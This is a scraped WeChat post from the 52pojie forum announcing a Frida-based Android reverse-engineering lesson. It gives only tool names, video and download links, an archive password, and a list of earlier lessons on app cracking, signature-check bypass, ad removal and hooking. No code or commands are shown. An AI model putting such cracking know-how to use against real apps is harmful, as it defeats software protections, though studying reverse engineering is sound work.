src="https://https://wechat2rss.xlab.app/img-proxy/?k=dbb52b99&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZK4vurNtX1rxTQjtTg4ULaVkwFdtgQUgib9Y9IRsFwgVpppBAXpIhnMqXNzMFtGx9YM8fUmK1oR4Nw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" /></p><p>frida实战安卓初级题与中级题</p><p>1.安卓初级题与中级题<br />2.jadx-gui<br />3.VS Code<br />4.jeb</p><h2>略。。。过程太长见论坛远程，看视频教程就行。</h2><p><span>百度云：</span></p><br /><p><span style="font-size: 15px;">https://pan.baidu.com/s/1cFWTLn14jeWfpXxlx3syYw?pwd=nqu9</span></p><br /><p><span style="font-size: 15px;">阿里云PS：</span></p><br /><p><span style="font-size: 15px;">https://www.aliyundrive.com/s/TJoKMK6du6x</span></p><br /><p><span style="font-size: 15px;">哔哩哔哩：</span></p><br /><p><span style="font-size: 15px;">https://www.bilibili.com/video/BV1X24y1m7cj</span></p><br /><p><span>PS:解压密码都是52pj，阿里云由于不能分享压缩包，所以下载exe文件，双击自解压</span></p><br /><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138475&amp;idx=1&amp;sn=e3c5242b7c51f022fcc0efb7f626ab61&amp;chksm=bd50b9ff8a2730e9484df2faa08ed63c1980d5f230b69200450917b0daae1904505c878daca8&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》一、模拟器环境搭建</a></p><br /><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138483&amp;idx=1&amp;sn=efa7eabbf0b0cc637a0ccdf8dd62abe5&amp;chksm=bd50b9e78a2730f1f994976f36a60dd8390c4920396b8aec2052b4a666d91d18555096fc8172&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》二、初识APK文件结构、双开、汉化、基础修改</a><br /><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138541&amp;idx=1&amp;sn=c7482f59c3d830b2646e276761928941&amp;chksm=bd50b9b98a2730af72e1f9e346663c12973821967c1ac002f5fcdabd0182af5f6106b36d6a01&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》三、初识smail，vip终结者</a><br /><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138554&amp;idx=1&amp;sn=be2fe7ffb0520ef17405a754ff0725c8&amp;chksm=bd50b9ae8a2730b84d054c7bd903f8a066251266e16cb1438999759797383e6f20aa656fbbff&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》四、恭喜你获得广告&amp;弹窗静默卡</a><br /><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138674&amp;idx=1&amp;sn=17a3271b1771bdacf3392fb64dcc5dc3&amp;chksm=bd50ba268a273330bea4fd1804afff15b9308ed53c88d9aa26a363da0bdeff63642fcce3a42b&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》五、1000-7=？&amp;动态调试&amp;Log插桩</a><br /><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138693&amp;idx=1&amp;sn=a09896ce9c1aa5e7194600ff7ca011e9&amp;chksm=bd50bad18a2733c7c536438f5181eb3d73a57c0349e010fda23d7973cb0ebf272f15b82be56a&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》六、校验的N次方-签名校验对抗、PM代{过}{滤}理、IO重定向</a><br /><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138779&amp;idx=1&amp;sn=7201ed7aca4cdd6954787022c7f26b81&amp;chksm=bd50ba8f8a2733998f65348060f3f6202bea1bba2f61d27e259ecf5521425ccdfcbb93510d06&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》七、Sorry，会Hook真的可以为所欲为-Xposed快速上手(上)模块编写,常用Api</a></p><br /><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651138987&amp;idx=1&amp;sn=c36c67b952a02f676fcdd5fb5c42abbc&amp;chksm=bd50bbff8a2732e9c5b256ec89ab50fe1df5158dfbcd4592f4440f564dec4d31e20387e0175b&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》八、Sorry，会Hook真的可以为所欲为-xposed快速上手(下)快速hook</a></p><br /><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139179&amp;idx=1&amp;sn=26e374dfb5776d41a7d3501770915a77&amp;chksm=bd50bc3f8a2735293c12856cfabf63aa694a2c66b8846a83eb9e301ac60d31484ed1600b8e1c&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》九、密码学基础、算法自吐、非标准加密对抗</a></p><br /><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139564&amp;idx=1&amp;sn=ed1a626174cd39572544fa54e320e135&amp;chksm=bd50bdb88a2734ae34b4d4bad5de061a368863cab0ac1e51c5969c926a6ebab29fbe5f729cbf&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十、不是我说，有了IDA还要什么女朋友？</a></p><br /><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139620&amp;idx=1&amp;sn=d65e23f4c8a5bc6cf94637af05025cea&amp;chksm=bd50be708a273766f5f00b91d3df8921283fecb3b2b54432bdee2b2b3330b5ea76c68f857bc9&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十二、大佬帮我分析一下</a></p><br /><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139664&amp;idx=1&amp;sn=8f76acd55355f1000afc0c85e35212b0&amp;chksm=bd50be048a2737124982c5985c5a5b2393fafcf77a30f43adb9072719092167c35f738afccce&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》番外实战篇1-某电影视全家桶</a></p><br /><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139714&amp;idx=1&amp;sn=28cc2ca160f7168a5ac43f658c5b57cd&amp;chksm=bd50bed68a2737c0ed9ff5513b2cf6aa5bcc6176f28b14f47bf8d32485b1d557bbc5f14f65bc&amp;scene=21#wechat_redirect" target="_blank"><span style="color: rgb(68, 68, 68);">《安卓逆向这档事》十三、是时候学习一下Frida一把梭了(上)</span></a></p><br /><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139750&amp;idx=1&amp;sn=17a282c1f0e2c56e7d8321867bc2685e&amp;chksm=bd50bef28a2737e4dae8032de4d19cf8e226a00801419c34b837b02074e10f84fe1c1aec4130&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十四、是时候学习一下Frida一把梭了(中)</a></p><br /><p><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139756&amp;idx=1&amp;sn=6c91893c01ccde3637ee64551ad67884&amp;chksm=bd50bef88a2737ee2eb88ce9c760937d701be06858c3dfec10af97f70b2ef847ebcf2b66e56f&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十五、是时候学习一下Frida一把梭了(下)</a></p><br /><p><span style="color: #576b95;"><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139867&amp;idx=1&amp;sn=cf9c990403c548b8495b3dde935a4644&amp;chksm=bd50bf4f8a273659ea78e3d7c191cdab463b4bc469f63fd5749028dba0fbf79fd796d74308fc&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十六、是时候学习一下Frida一把梭了(终)</a></span></p><br /><p><span style="color: #576b95;"><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140090&amp;idx=1&amp;sn=d8b3011c016ae650d83db7bd9363878c&amp;chksm=bd50bfae8a2736b8260a8115ae2b0b95c929c8b221cabd8733853f6ba5409180b6a1443b30c0&amp;scene=21#wechat_redirect" target="_blank">《安卓逆向这档事》十七、你的RPCvs佬的RPC</a><br /></span><a href="http://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651139756&amp;idx=1&amp;sn=6c91893c01ccde3637ee64551ad67884&amp;chksm=bd50bef88a2737ee2eb88ce9c760937d701be06858c3dfec10af97f70b2ef847ebcf2b66e56f&amp;scene=21#wechat_redirect" style="color: rgb(68, 68, 68);" target="_blank"></a><br /></p><br /><p style="margin-bottom: 15px;">dex起步探索</p><p><br /></p><br /><p><span>详细文字介绍、视频原件下载、视频所用到的程序下载、课后作业和学习交流参看论坛原文：</span></p><br /><p><span>https://www.52pojie.cn/thread-1892127-1-1.html</span></p><br /><p><span><br /></span></p><br /><p><span style="font-size: 24px;"><span style="color: rgb(255, 0, 0);">点击左下角“阅读原文”，</span><strong><span style="color: rgb(255, 0, 0);">进入 <em>B站 </em>在</span></strong></span><span style="color: rgb(255, 0, 0); font-size: 24px;"><strong>线观看视频教程，</strong>欢迎一键三连转发</span><span style="font-size: 24px; color: rgb(255, 0, 0);">~</span></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><br /></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.bilibili.com/video/BV1NW421P7CF">阅读原文</a></p>
]]></content:encoded>
<pubDate>Wed, 28 Feb 2024 15:35:53 +0800</pubDate>
</item>
</channel>
</rss>